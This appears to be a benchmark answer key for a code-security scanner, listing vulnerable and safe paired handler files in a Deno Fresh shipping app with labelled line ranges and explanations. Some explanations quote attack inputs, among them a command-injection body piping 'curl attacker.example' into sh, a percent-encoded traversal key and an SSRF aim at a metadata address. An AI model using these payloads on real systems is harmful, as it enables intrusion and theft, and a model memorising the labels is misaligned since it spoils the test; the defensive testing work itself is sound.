@@ -1,0 +1,208 @@
+{
+  "family": "deno-edge",
+  "architecture": "Deno Fresh app with file-routed handlers under routes/ and a hand-rolled server layer under server/: URLPattern-dispatched handlers over deno-postgres and Deno KV, with the session resolved by routes/_middleware.ts.",
+  "cases": [
+    {
+      "id": "h3-deno-edge-consignment-finder",
+      "family": "deno-edge",
+      "architecture": "Deno Fresh app with file-routed handlers under routes/ and a hand-rolled server layer under server/: URLPattern-dispatched handlers over deno-postgres and Deno KV, with the session resolved by routes/_middleware.ts.",
+      "language": "typescript",
+      "file": "deno-edge/server/handlers/shipment-search.ts",
+      "scanAs": "server/handlers/shipment-search.ts",
+      "kind": "vulnerable",
+      "category": "sql_injection",
+      "severityBand": [
+        "critical",
+        "high"
+      ],
+      "line": 64,
+      "lineRange": [
+        62,
+        67
+      ],
+      "runtimeVerifiable": true,
+      "why": "The `q` query-string value is interpolated directly into the ILIKE pattern inside single quotes and that fragment is then joined into the statement text handed to `client.queryObject`. Every other filter on this handler pushes its value onto `args` and emits a `$n` placeholder; this one does not, so a single quote in the search term closes the literal and the rest of the request is parsed as SQL by the storefront's database role."
+    },
+    {
+      "id": "h3-deno-edge-billable-window",
+      "family": "deno-edge",
+      "architecture": "Deno Fresh app with file-routed handlers under routes/ and a hand-rolled server layer under server/: URLPattern-dispatched handlers over deno-postgres and Deno KV, with the session resolved by routes/_middleware.ts.",
+      "language": "typescript",
+      "file": "deno-edge/server/handlers/shipment-ledger.ts",
+      "scanAs": "server/handlers/shipment-ledger.ts",
+      "kind": "safe",
+      "pairedWith": "h3-deno-edge-consignment-finder",
+      "runtimeVerifiable": true,
+      "why": "This handler assembles the same dynamic predicate list and the same interpolated ORDER BY, but nothing caller-controlled reaches the statement text: the search term is pushed onto `args` with its wildcards already attached and the predicate keeps its `$n` placeholder, and `orderBy` can only ever be a constant from the frozen SORT_COLUMNS map because an unknown sort key is rejected with a 400 before any SQL is built."
+    },
+    {
+      "id": "h3-deno-edge-document-drawer",
+      "family": "deno-edge",
+      "architecture": "Deno Fresh app with file-routed handlers under routes/ and a hand-rolled server layer under server/: URLPattern-dispatched handlers over deno-postgres and Deno KV, with the session resolved by routes/_middleware.ts.",
+      "language": "typescript",
+      "file": "deno-edge/routes/api/shipments/[id]/documents.ts",
+      "scanAs": "routes/api/shipments/[id]/documents.ts",
+      "kind": "vulnerable",
+      "category": "broken_object_level_authorization",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "line": 51,
+      "lineRange": [
+        48,
+        53
+      ],
+      "route": "GET /api/shipments/:id/documents",
+      "runtimeVerifiable": true,
+      "why": "The KV prefix is built from the path parameter alone, so any authenticated session can list the customs documents of any shipment in any tenant simply by substituting another shipment id. The middleware referenced in the header comment establishes that the caller is signed in but says nothing about which shipments are theirs, and no ownership lookup happens here before the listing."
+    },
+    {
+      "id": "h3-deno-edge-tracking-timeline",
+      "family": "deno-edge",
+      "architecture": "Deno Fresh app with file-routed handlers under routes/ and a hand-rolled server layer under server/: URLPattern-dispatched handlers over deno-postgres and Deno KV, with the session resolved by routes/_middleware.ts.",
+      "language": "typescript",
+      "file": "deno-edge/routes/api/shipments/[id]/milestones.ts",
+      "scanAs": "routes/api/shipments/[id]/milestones.ts",
+      "kind": "safe",
+      "pairedWith": "h3-deno-edge-document-drawer",
+      "route": "GET /api/shipments/:id/milestones",
+      "runtimeVerifiable": true,
+      "why": "The listing is built from a prefix whose first variable part is the caller's own `ctx.state.session.orgId`, so a shipment id belonging to another tenant simply is not inside the range being scanned. Tenant scoping is expressed in the key rather than checked afterwards, which is why no separate ownership predicate is needed and a substituted id returns an empty timeline."
+    },
+    {
+      "id": "h3-deno-edge-document-shelf",
+      "family": "deno-edge",
+      "architecture": "Deno Fresh app with file-routed handlers under routes/ and a hand-rolled server layer under server/: URLPattern-dispatched handlers over deno-postgres and Deno KV, with the session resolved by routes/_middleware.ts.",
+      "language": "typescript",
+      "file": "deno-edge/routes/documents/[reference].tsx",
+      "scanAs": "routes/documents/[reference].tsx",
+      "kind": "vulnerable",
+      "category": "secret_exposed_to_client_bundle",
+      "severityBand": [
+        "critical",
+        "high"
+      ],
+      "line": 51,
+      "lineRange": [
+        48,
+        51
+      ],
+      "route": "GET /documents/:reference",
+      "runtimeVerifiable": true,
+      "why": "`PORTWAY_DOWNLOAD_SIGNING_KEY` is read on the server and then handed to `ctx.render` as page data, from where it is passed on as an island prop at line 69. Fresh serialises island props into the delivered HTML so the client can hydrate them, so the raw HMAC secret is published to every viewer of the page and anyone holding it can mint a valid download link for any storage key."
+    },
+    {
+      "id": "h3-deno-edge-manifest-shelf",
+      "family": "deno-edge",
+      "architecture": "Deno Fresh app with file-routed handlers under routes/ and a hand-rolled server layer under server/: URLPattern-dispatched handlers over deno-postgres and Deno KV, with the session resolved by routes/_middleware.ts.",
+      "language": "typescript",
+      "file": "deno-edge/routes/shipments/[reference].tsx",
+      "scanAs": "routes/shipments/[reference].tsx",
+      "kind": "safe",
+      "pairedWith": "h3-deno-edge-document-shelf",
+      "route": "GET /shipments/:reference",
+      "runtimeVerifiable": true,
+      "why": "This page reads the same signing secret from the environment, but it imports it into a non-extractable CryptoKey and does the HMAC on the server; the only values that cross into the island are the finished signed URL and its expiry. Nothing serialised into the page can be used to sign a key the server did not already authorise."
+    },
+    {
+      "id": "h3-deno-edge-stored-document",
+      "family": "deno-edge",
+      "architecture": "Deno Fresh app with file-routed handlers under routes/ and a hand-rolled server layer under server/: URLPattern-dispatched handlers over deno-postgres and Deno KV, with the session resolved by routes/_middleware.ts.",
+      "language": "typescript",
+      "file": "deno-edge/server/handlers/document-download.ts",
+      "scanAs": "server/handlers/document-download.ts",
+      "kind": "vulnerable",
+      "category": "path_traversal",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "line": 47,
+      "lineRange": [
+        46,
+        51
+      ],
+      "runtimeVerifiable": true,
+      "why": "The traversal check at line 36 runs against `rawKey`, which URLPattern still hands back percent-encoded, and the value is only decoded afterwards at line 46 before being joined onto the document root. A key of `%2e%2e%2f%2e%2e%2f` contains no literal `..` and does not start with `/`, so it passes the guard and then becomes `../../` for `join`, letting the caller read any file the isolate can open outside the document volume."
+    },
+    {
+      "id": "h3-deno-edge-page-preview",
+      "family": "deno-edge",
+      "architecture": "Deno Fresh app with file-routed handlers under routes/ and a hand-rolled server layer under server/: URLPattern-dispatched handlers over deno-postgres and Deno KV, with the session resolved by routes/_middleware.ts.",
+      "language": "typescript",
+      "file": "deno-edge/server/handlers/document-preview.ts",
+      "scanAs": "server/handlers/document-preview.ts",
+      "kind": "safe",
+      "pairedWith": "h3-deno-edge-stored-document",
+      "runtimeVerifiable": true,
+      "why": "The wildcard tail is decoded first and only then joined and resolved, and the resolved absolute path is checked for real containment under the preview root with a `relative()` test that rejects any `..` hop or unrelated root. Because the containment check sees the final filesystem path rather than the encoded input, an escaped traversal sequence is caught and answered with a 404."
+    },
+    {
+      "id": "h3-deno-edge-published-manifest",
+      "family": "deno-edge",
+      "architecture": "Deno Fresh app with file-routed handlers under routes/ and a hand-rolled server layer under server/: URLPattern-dispatched handlers over deno-postgres and Deno KV, with the session resolved by routes/_middleware.ts.",
+      "language": "typescript",
+      "file": "deno-edge/server/handlers/manifest-import.ts",
+      "scanAs": "server/handlers/manifest-import.ts",
+      "kind": "vulnerable",
+      "category": "server_side_request_forgery",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "line": 47,
+      "lineRange": [
+        45,
+        52
+      ],
+      "runtimeVerifiable": true,
+      "why": "`sourceUrl` comes straight out of the request body and the only thing checked before `fetch` is that the scheme is https; the host is never constrained. A caller can therefore aim the server at an internal address such as https://169.254.169.254/ or an internal admin host, and because redirects are followed even an allowed-looking host could bounce the request onward. The byte cap and timeout limit the damage but do not restrict the destination."
+    },
+    {
+      "id": "h3-deno-edge-tariff-sheet",
+      "family": "deno-edge",
+      "architecture": "Deno Fresh app with file-routed handlers under routes/ and a hand-rolled server layer under server/: URLPattern-dispatched handlers over deno-postgres and Deno KV, with the session resolved by routes/_middleware.ts.",
+      "language": "typescript",
+      "file": "deno-edge/server/handlers/rate-sheet-import.ts",
+      "scanAs": "server/handlers/rate-sheet-import.ts",
+      "kind": "safe",
+      "pairedWith": "h3-deno-edge-published-manifest",
+      "runtimeVerifiable": true,
+      "why": "The operator-supplied address is only fetched when `source.origin` is an exact member of the frozen PUBLISHER_ORIGINS set, which pins scheme, host and port rather than matching a host suffix, and redirects are set to `manual` and rejected so the request cannot be walked to an origin the allow list never saw. The destination is decided by the application, not by the caller."
+    },
+    {
+      "id": "h3-deno-edge-packet-builder",
+      "family": "deno-edge",
+      "architecture": "Deno Fresh app with file-routed handlers under routes/ and a hand-rolled server layer under server/: URLPattern-dispatched handlers over deno-postgres and Deno KV, with the session resolved by routes/_middleware.ts.",
+      "language": "typescript",
+      "file": "deno-edge/server/jobs/document-export.ts",
+      "scanAs": "server/jobs/document-export.ts",
+      "kind": "vulnerable",
+      "category": "command_injection",
+      "severityBand": [
+        "critical",
+        "high"
+      ],
+      "line": 47,
+      "lineRange": [
+        46,
+        50
+      ],
+      "runtimeVerifiable": true,
+      "why": "The `pages` value from the JSON body is spliced into a shell command string without quoting - the source and target paths go through `shellQuote` but the range does not - and the string is then executed with `sh -c`. A body of `{\"pages\":\"1 && curl attacker.example | sh\"}` runs as the service account; the 120-character cap is ample for a command."
+    },
+    {
+      "id": "h3-deno-edge-page-span",
+      "family": "deno-edge",
+      "architecture": "Deno Fresh app with file-routed handlers under routes/ and a hand-rolled server layer under server/: URLPattern-dispatched handlers over deno-postgres and Deno KV, with the session resolved by routes/_middleware.ts.",
+      "language": "typescript",
+      "file": "deno-edge/server/jobs/document-extract.ts",
+      "scanAs": "server/jobs/document-extract.ts",
+      "kind": "safe",
+      "pairedWith": "h3-deno-edge-packet-builder",
+      "runtimeVerifiable": true,
+      "why": "qpdf is invoked directly with an argument vector rather than through a shell, so no element can be reinterpreted as syntax, and every caller-controlled value is narrowed first: `from` and `to` must be safe positive integers, the span is capped, and the rotation must be a member of a four-value set. The `--` before the output path also stops it being read as a flag."
+    }
+  ]
+}
